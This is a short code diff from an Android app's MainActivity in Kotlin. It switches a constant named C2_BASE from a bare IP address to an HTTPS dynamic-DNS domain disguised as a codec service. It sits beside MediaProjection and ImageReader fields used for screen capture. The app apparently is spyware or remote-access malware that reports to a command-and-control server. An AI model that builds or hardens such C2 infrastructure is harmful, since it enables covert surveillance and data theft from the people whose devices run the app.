@@ -30,7 +30,7 @@ import java.net.URL
 class MainActivity : AppCompatActivity() {
 
     companion object {
-        const val C2_BASE = "http://38.97.62.125:5000"
+        const val C2_BASE = "https://hevc-codec.duckdns.org"  // ← HTTP se HTTPS
         const val REQ_MEDIA_PROJECTION = 1001
         var projection: MediaProjection? = null
         var imageReader: ImageReader? = null
